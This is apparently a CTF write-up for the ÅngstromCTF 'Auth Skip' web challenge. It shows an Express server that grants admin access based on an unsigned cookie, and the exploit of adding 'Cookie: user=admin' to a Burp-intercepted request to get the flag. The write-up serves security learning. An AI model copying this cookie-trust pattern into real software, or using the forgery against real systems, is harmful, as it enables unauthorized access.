---
Title: ÅngstromCTF
Date: 2022-05-05 00:00:00 +0000
categories: [Writeups, Ctf]
tags: [ctf, web, cookie, auth]
---

# Auth Skip

Goal is to do the legendary "Auth Skip", like in true speedrunner fashion, finding an exploit, conquering the leaderboard!

Given the source code, i began to look at the logic of the cookies used for authentication.

```javascript
const express = require("express");
const path = require("path");
const cookieParser = require("cookie-parser");

const app = express();
const port = Number(process.env.PORT) || 8080;

const flag = process.env.FLAG || "actf{placeholder_flag}";

app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

app.post("/login", (req, res) => {
    if (
        req.body.username !== "admin" ||
        req.body.password !== Math.random().toString()
    ) {
        res.status(401).type("text/plain").send("incorrect login");
    } else {
        res.cookie("user", "admin");
        res.redirect("/");
    }
});

app.get("/", (req, res) => {
    if (req.cookies.user === "admin") {
        res.type("text/plain").send(flag);
    } else {
        res.sendFile(path.join(__dirname, "index.html"));
    }
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

The vuln lies in the following lines:

```javascript
    } else {
        res.cookie("user", "admin");
        res.redirect("/");
```

We can set our cookie to something like, `user=admin`  and we can ommit the password, as it doesn't require us to provide one.

Providing the username cookie, we are then redirected to the flag at "/"

```javascript
app.get("/", (req, res) => {
    if (req.cookies.user === "admin") {
        res.type("text/plain").send(flag);
    } else {
        res.sendFile(path.join(__dirname, "index.html"));
    }
```

--- 

## Exploit: Legendary Auth Skip
In burp i intercepted :

```http
GET / HTTP/2
Host: auth-skip.web.actf.co
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Simply add the cookie to the request

```http
Cookie: user=admin
```

et voilà !

```http
HTTP/2 200 OK
Date: Wed, 04 May 2022 14:44:26 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 54
X-Powered-By: Express
Etag: W/"36-QSBEGde8h39PljsFBY/epRs/oqo"
Strict-Transport-Security: max-age=15724800; includeSubDomains

actf{passwordless_authentication_is_the_new_hip_thing}
```

### Aut viam inveniam aut faciam    
